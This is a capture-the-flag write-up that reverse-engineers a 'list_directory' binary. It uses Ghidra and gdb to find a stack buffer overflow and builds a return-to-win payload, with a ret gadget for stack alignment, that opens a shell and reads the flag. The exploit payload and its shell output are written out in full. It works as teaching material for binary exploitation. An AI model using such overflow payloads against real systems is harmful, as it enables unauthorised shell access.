# List Directory

Subject :

```md
I am making a program to replace ls, but I have not even started and a friend told me it was unsecure, can you investigate for me ?

http://internetcest.fun:13339
```

[This binary](./list_directory) is given. Let's try it out :

```bash
$ ./list_directory 
Enter the path you want to list: 
test
Not implemented yet!
```

# Reverse

Using Ghidra, we can find those functions :

```C
undefined8 main(undefined4 param_1,undefined8 param_2)

{
  char *pcVar1;
  ulong uVar2;
  ssize_t sVar3;
  size_t sVar4;
  undefined8 auStack_60 [2];
  undefined4 local_4c;
  undefined8 *local_48;
  long local_40;
  
  auStack_60[0] = 0x401243;
  auStack_60[1] = param_2;
  local_4c = param_1;
  setup();
  local_40 = (long)PATH_LEN + -1;
  uVar2 = ((long)PATH_LEN + 0xfU) / 0x10;
  local_48 = auStack_60 + uVar2 * -2 + 1;
  auStack_60[uVar2 * -2] = 0x4012a8;
  puts("Enter the path you want to list: ");
  pcVar1 = (char *)local_48;
  auStack_60[uVar2 * -2] = 0x4012c2;
  sVar3 = read(0,pcVar1,(long)PATH_LEN);
  pcVar1 = (char *)local_48;
  PATH_LEN = (int)sVar3;
  auStack_60[uVar2 * -2] = 0x4012d4;
  sVar4 = strlen(pcVar1);
  pcVar1 = (char *)local_48;
  *(char *)((long)local_48 + sVar4) = '\0';
  auStack_60[uVar2 * -2] = 0x4012e8;
  vuln(pcVar1);
  return 0;
}

void vuln(void *param_1)
{
  undefined6 local_20;
  undefined2 uStack_1a;
  undefined6 uStack_18;
  undefined8 local_12;
  
  local_20 = 0;
  uStack_1a = 0;
  uStack_18 = 0;
  local_12 = 0;
  memcpy(&local_20,param_1,(long)PATH_LEN);
  puts("Not implemented yet! ");
  return;
}

void win(void)
{
  puts("Bravo !");
  system("/bin/sh");
  return;
}
```

We can understand that the main() function is getting the user input : 

```C
sVar3 = read(0,pcVar1,(long)PATH_LEN);
```

Passing it to the vuln() function :

```C
vuln(pcVar1);
```

And the vuln() function is copying it to a local variable :

```C
memcpy(&local_20,param_1,(long)PATH_LEN);
```

Let's try and exploit a buffer overflow to redirect the program towards the win() function after vuln().  
  
This function being extremely obfuscated, let's try to analyse the binary dynamically instead of understanding all of the code.

# Payload

We're going to use gdb to observe what's going on with our input during the execution of this program.  
  
First let's put breakpoints all over the program :

```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040121b <+0>:	push   %rbp
   0x000000000040121c <+1>:	mov    %rsp,%rbp
   0x000000000040121f <+4>:	push   %r15
   0x0000000000401221 <+6>:	push   %r14
   0x0000000000401223 <+8>:	push   %r13
   0x0000000000401225 <+10>:	push   %r12
   0x0000000000401227 <+12>:	push   %rbx
   0x0000000000401228 <+13>:	sub    $0x28,%rsp
   0x000000000040122c <+17>:	mov    %edi,-0x44(%rbp)
   0x000000000040122f <+20>:	mov    %rsi,-0x50(%rbp)
   0x0000000000401233 <+24>:	mov    %rsp,%rax
   0x0000000000401236 <+27>:	mov    %rax,%rbx
   0x0000000000401239 <+30>:	mov    $0x0,%eax
   0x000000000040123e <+35>:	call   0x40119b <setup>
   0x0000000000401243 <+40>:	mov    0x2df7(%rip),%eax        # 0x404040 <PATH_LEN>
   0x0000000000401249 <+46>:	movslq %eax,%rdx
   0x000000000040124c <+49>:	sub    $0x1,%rdx
   0x0000000000401250 <+53>:	mov    %rdx,-0x38(%rbp)
   0x0000000000401254 <+57>:	movslq %eax,%rdx
   0x0000000000401257 <+60>:	mov    %rdx,%r14
   0x000000000040125a <+63>:	mov    $0x0,%r15d
   0x0000000000401260 <+69>:	movslq %eax,%rdx
   0x0000000000401263 <+72>:	mov    %rdx,%r12
   0x0000000000401266 <+75>:	mov    $0x0,%r13d
   0x000000000040126c <+81>:	cltq
   0x000000000040126e <+83>:	mov    $0x10,%edx
   0x0000000000401273 <+88>:	sub    $0x1,%rdx
   0x0000000000401277 <+92>:	add    %rdx,%rax
   0x000000000040127a <+95>:	mov    $0x10,%ecx
   0x000000000040127f <+100>:	mov    $0x0,%edx
   0x0000000000401284 <+105>:	div    %rcx
   0x0000000000401287 <+108>:	imul   $0x10,%rax,%rax
   0x000000000040128b <+112>:	sub    %rax,%rsp
   0x000000000040128e <+115>:	mov    %rsp,%rax
   0x0000000000401291 <+118>:	add    $0x0,%rax
   0x0000000000401295 <+122>:	mov    %rax,-0x40(%rbp)
   0x0000000000401299 <+126>:	lea    0xd90(%rip),%rax        # 0x402030
   0x00000000004012a0 <+133>:	mov    %rax,%rdi
   0x00000000004012a3 <+136>:	call   0x401030 <puts@plt>
   0x00000000004012a8 <+141>:	mov    0x2d92(%rip),%eax        # 0x404040 <PATH_LEN>
   0x00000000004012ae <+147>:	movslq %eax,%rdx
   0x00000000004012b1 <+150>:	mov    -0x40(%rbp),%rax
   0x00000000004012b5 <+154>:	mov    %rax,%rsi
   0x00000000004012b8 <+157>:	mov    $0x0,%edi
   0x00000000004012bd <+162>:	call   0x401070 <read@plt>
   0x00000000004012c2 <+167>:	mov    %eax,0x2d78(%rip)        # 0x404040 <PATH_LEN>
   0x00000000004012c8 <+173>:	mov    -0x40(%rbp),%rax
   0x00000000004012cc <+177>:	mov    %rax,%rdi
   0x00000000004012cf <+180>:	call   0x401040 <strlen@plt>
   0x00000000004012d4 <+185>:	mov    -0x40(%rbp),%rdx
   0x00000000004012d8 <+189>:	movb   $0x0,(%rdx,%rax,1)
   0x00000000004012dc <+193>:	mov    -0x40(%rbp),%rax
   0x00000000004012e0 <+197>:	mov    %rax,%rdi
   0x00000000004012e3 <+200>:	call   0x4011b6 <vuln>
   0x00000000004012e8 <+205>:	mov    $0x0,%eax
   0x00000000004012ed <+210>:	mov    %rbx,%rsp
   0x00000000004012f0 <+213>:	lea    -0x28(%rbp),%rsp
   0x00000000004012f4 <+217>:	pop    %rbx
   0x00000000004012f5 <+218>:	pop    %r12
   0x00000000004012f7 <+220>:	pop    %r13
   0x00000000004012f9 <+222>:	pop    %r14
   0x00000000004012fb <+224>:	pop    %r15
   0x00000000004012fd <+226>:	pop    %rbp
   0x00000000004012fe <+227>:	ret
End of assembler dump.
(gdb) break *main+167
Breakpoint 1 at 0x4012c2
(gdb) break *main+200
Breakpoint 2 at 0x4012e3
(gdb) break *vuln
Breakpoint 3 at 0x4011b6
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x00000000004011b6 <+0>:	push   %rbp
   0x00000000004011b7 <+1>:	mov    %rsp,%rbp
   0x00000000004011ba <+4>:	sub    $0x30,%rsp
   0x00000000004011be <+8>:	mov    %rdi,-0x28(%rbp)
   0x00000000004011c2 <+12>:	movabs $0x20736c2f6e69622f,%rax
   0x00000000004011cc <+22>:	mov    $0x0,%edx
   0x00000000004011d1 <+27>:	mov    %rax,-0x20(%rbp)
   0x00000000004011d5 <+31>:	mov    %rdx,-0x18(%rbp)
   0x00000000004011d9 <+35>:	movq   $0x0,-0x12(%rbp)
   0x00000000004011e1 <+43>:	movq   $0x0,-0xa(%rbp)
   0x00000000004011e9 <+51>:	mov    0x2e51(%rip),%eax        # 0x404040 <PATH_LEN>
   0x00000000004011ef <+57>:	movslq %eax,%rdx
   0x00000000004011f2 <+60>:	mov    -0x28(%rbp),%rax
   0x00000000004011f6 <+64>:	lea    -0x20(%rbp),%rcx
   0x00000000004011fa <+68>:	add    $0x8,%rcx
   0x00000000004011fe <+72>:	mov    %rax,%rsi
   0x0000000000401201 <+75>:	mov    %rcx,%rdi
   0x0000000000401204 <+78>:	call   0x401080 <memcpy@plt>
   0x0000000000401209 <+83>:	lea    0xe08(%rip),%rax        # 0x402018
   0x0000000000401210 <+90>:	mov    %rax,%rdi
   0x0000000000401213 <+93>:	call   0x401030 <puts@plt>
   0x0000000000401218 <+98>:	nop
   0x0000000000401219 <+99>:	leave
   0x000000000040121a <+100>:	ret
End of assembler dump.
(gdb) break *vuln+78
Breakpoint 4 at 0x401204
```

Now, we're going to input 4 "\x41", and print out the stack at every break to try and find our input :

```gdb
(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*4)')
Starting program: /home/coucou/Documents/CTF_SSI_2024/03_List_Directory/list_directory <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the path you want to list: 

Breakpoint 1, 0x00000000004012c2 in main ()
(gdb) x/24wx $rsp
0x7fffffffd940:	0x41414141	0x0000000a	0x00000000	0x00000000
0x7fffffffd950:	0xf7f99600	0x00007fff	0xf7e47e89	0x00007fff
0x7fffffffd960:	0xf7f9d780	0x00007fff	0xf7e3f20d	0x00007fff
0x7fffffffd970:	0x00000000	0x00000000	0xffffd9b0	0x00007fff
0x7fffffffd980:	0xffffd9a0	0x00007fff	0x00000000	0x00000000
0x7fffffffd990:	0xffffdb28	0x00007fff	0x004011b3	0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004012e3 in main ()
(gdb) x/24wx $rsp
0x7fffffffd940:	0x41414141	0x0000000a	0x00000000	0x00000000
0x7fffffffd950:	0xf7f99600	0x00007fff	0xf7e47e89	0x00007fff
0x7fffffffd960:	0xf7f9d780	0x00007fff	0xf7e3f20d	0x00007fff
0x7fffffffd970:	0x00000000	0x00000000	0xffffd9b0	0x00007fff
0x7fffffffd980:	0xffffd9a0	0x00007fff	0x00000000	0x00000000
0x7fffffffd990:	0xffffdb28	0x00007fff	0x004011b3	0x00000000
(gdb) c
Continuing.

Breakpoint 3, 0x00000000004011b6 in vuln ()
(gdb) x/24wx $rsp
0x7fffffffd938:	0x004012e8	0x00000000	0x41414141	0x0000000a
0x7fffffffd948:	0x00000000	0x00000000	0xf7f99600	0x00007fff
0x7fffffffd958:	0xf7e47e89	0x00007fff	0xf7f9d780	0x00007fff
0x7fffffffd968:	0xf7e3f20d	0x00007fff	0x00000000	0x00000000
0x7fffffffd978:	0xffffd9b0	0x00007fff	0xffffd9a0	0x00007fff
0x7fffffffd988:	0x00000000	0x00000000	0xffffdb28	0x00007fff
(gdb) c
Continuing.

Breakpoint 4, 0x0000000000401204 in vuln ()
(gdb) x/24wx $rsp
0x7fffffffd900:	0x00000000	0x00000000	0xffffd940	0x00007fff
0x7fffffffd910:	0x6e69622f	0x20736c2f	0x00000000	0x00000000
0x7fffffffd920:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd930:	0xffffda00	0x00007fff	0x004012e8	0x00000000
0x7fffffffd940:	0x41414141	0x0000000a	0x00000000	0x00000000
0x7fffffffd950:	0xf7f99600	0x00007fff	0xf7e47e89	0x00007fff
(gdb) next instruction
0x0000000000401209 in vuln ()
(gdb) x/24wx $rsp
0x7fffffffd900:	0x00000000	0x00000000	0xffffd940	0x00007fff
0x7fffffffd910:	0x6e69622f	0x20736c2f	0x41414141	0x0000000a
0x7fffffffd920:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd930:	0xffffda00	0x00007fff	0x004012e8	0x00000000
0x7fffffffd940:	0x41414141	0x0000000a	0x00000000	0x00000000
0x7fffffffd950:	0xf7f99600	0x00007fff	0xf7e47e89	0x00007fff
(gdb) info register
rax            0x7fffffffd918      140737488345368
rbx            0x7fffffffd9b0      140737488345520
rcx            0xa414141           172048705
rdx            0x5                 5
rsi            0x41414141          1094795585
rdi            0x7fffffffd918      140737488345368
rbp            0x7fffffffd930      0x7fffffffd930
rsp            0x7fffffffd900      0x7fffffffd900
r8             0x0                 0
r9             0x7ffff7fcfb10      140737353939728
r10            0x7ffff7de1970      140737351915888
r11            0x7ffff7f1b3f0      140737353200624
r12            0x64                100
r13            0x0                 0
r14            0x64                100
r15            0x0                 0
rip            0x401209            0x401209 <vuln+83>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
```

We can see that our input is constantly present on the stack and not being modified before it's passed on to the vuln() function.  
  
Looking at the register and where the rbp is stored in vuln(), we can determine that we need to write over 32 bytes to reach the return pointer. Let's try a payload : 32 bytes to reach the return address, and a pointer to the win() function.

```gdb
(gdb) info func win
All functions matching regular expression "win":

File ../sysdeps/generic/unwind-resume.c:
48:	_Unwind_Reason_Code _Unwind_ForcedUnwind(struct _Unwind_Exception *, _Unwind_Stop_Fn, void *);
56:	_Unwind_Word _Unwind_GetCFA(struct _Unwind_Context *);
35:	void _Unwind_Resume(struct _Unwind_Exception *);

File ../sysdeps/nptl/jmp-unwind.c:
25:	void _longjmp_unwind(struct __jmp_buf_tag *, int);

File ../sysdeps/unix/sysv/linux/rewinddir.c:
26:	void __GI___rewinddir(DIR *);
26:	void __rewinddir(DIR *);

File ./libio/rewind.c:
31:	void __GI_rewind(FILE *);

File ./misc/unwind-link.c:
41:	struct unwind_link *__GI___libc_unwind_link_get(void);
119:	void __libc_unwind_link_after_fork(void);
135:	void __libc_unwind_link_freeres(void);

File ./nptl/unwind.c:
120:	void __GI___pthread_unwind(__pthread_unwind_buf_t *);
140:	void ___pthread_unwind_next(__pthread_unwind_buf_t *);
110:	static void unwind_cleanup(_Unwind_Reason_Code, struct _Unwind_Exception *);
39:	static _Unwind_Reason_Code unwind_stop(int, _Unwind_Action, _Unwind_Exception_Class, struct _Unwind_Exception *, struct _Unwind_Context *, void *);

Non-debugging symbols:
0x0000000000401176  win
(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x76\x11\x40\x00"+b"\x00"*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/coucou/Documents/CTF_SSI_2024/03_List_Directory/list_directory <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x76\x11\x40\x00"+b"\x00"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the path you want to list: 

Not implemented yet! 
Bravo !

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e15603 in do_system (line=0x402010 "/bin/sh") at ../sysdeps/posix/system.c:148
148	../sysdeps/posix/system.c: No such file or directory.
```

We've reached the success message, but ran into a SIGSEGV. Let's take a closer look :

```gdb
(gdb) 

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e15603 in do_system (line=0x402010 "/bin/sh") at ../sysdeps/posix/system.c:148
148	../sysdeps/posix/system.c: No such file or directory.
(gdb) x/wi 0x00007ffff7e15603
=> 0x7ffff7e15603 <do_system+339>:	movaps %xmm0,0x50(%rsp)
```

Using the `x/wi` which prints out the instruction at the given address, we can find out that the program crashed while trying to execute a movaps instruction. Thanks to [this blog](https://ropemporium.com/guide.html#Common-pitfalls), we can understand that the stack might be misaligned because of our injections. Apparently we need execute a `ret` instruction to realign it. Let's find an address to a `ret` instruction :

```gdb
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x00000000004011b6 <+0>:	push   %rbp
   0x00000000004011b7 <+1>:	mov    %rsp,%rbp
   0x00000000004011ba <+4>:	sub    $0x30,%rsp
   0x00000000004011be <+8>:	mov    %rdi,-0x28(%rbp)
   0x00000000004011c2 <+12>:	movabs $0x20736c2f6e69622f,%rax
   0x00000000004011cc <+22>:	mov    $0x0,%edx
   0x00000000004011d1 <+27>:	mov    %rax,-0x20(%rbp)
   0x00000000004011d5 <+31>:	mov    %rdx,-0x18(%rbp)
   0x00000000004011d9 <+35>:	movq   $0x0,-0x12(%rbp)
   0x00000000004011e1 <+43>:	movq   $0x0,-0xa(%rbp)
   0x00000000004011e9 <+51>:	mov    0x2e51(%rip),%eax        # 0x404040 <PATH_LEN>
   0x00000000004011ef <+57>:	movslq %eax,%rdx
   0x00000000004011f2 <+60>:	mov    -0x28(%rbp),%rax
   0x00000000004011f6 <+64>:	lea    -0x20(%rbp),%rcx
   0x00000000004011fa <+68>:	add    $0x8,%rcx
   0x00000000004011fe <+72>:	mov    %rax,%rsi
   0x0000000000401201 <+75>:	mov    %rcx,%rdi
   0x0000000000401204 <+78>:	call   0x401080 <memcpy@plt>
   0x0000000000401209 <+83>:	lea    0xe08(%rip),%rax        # 0x402018
   0x0000000000401210 <+90>:	mov    %rax,%rdi
   0x0000000000401213 <+93>:	call   0x401030 <puts@plt>
   0x0000000000401218 <+98>:	nop
   0x0000000000401219 <+99>:	leave
   0x000000000040121a <+100>:	ret
End of assembler dump.
```

The last instruction of vuln() being `ret`, let's use this one. Now let's try a new payload : 32 bytes to reach the return address, a pointer to the `ret` instruction, and a pointer to the win() function.

```gdb
(gdb)  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)')
Starting program: /home/coucou/Documents/CTF_SSI_2024/03_List_Directory/list_directory <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the path you want to list: 
Not implemented yet! 

Bravo !
[Detaching after vfork from child process 9156]

Program received signal SIGSEGV, Segmentation fault.
0x000000000040119a in win ()
```

Gdb started a new process, let's try this payload on the binary the same way we did on the previous challenges :


```console
$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)' ; tee) | ./list_directory 
Enter the path you want to list: 
Not implemented yet! 
Bravo !
whoami
coucou
ls
exploit.py  list_directory  README.md
```
We successfully opened a shell, our final payload is : `"\x41"*32+"\x1a\x12\x40\x00"+"\x00"*4+"\x76\x11\x40\x00"+"\x00"*4`.

# Script

Now let's use [this script](./exploit.py) to send our payload.

```console
$ python3 ./exploit.py
b'Enter the path you want to list: \nNot implemented yet! \nBravo !\n'
whoami
b'root\n'
ls
b'core\nflag.txt\nlist_directory\nlist_directory.c\n'
cat flag.txt
b'FLAG{TR1CKY_0V3RFL0W}\n'
```
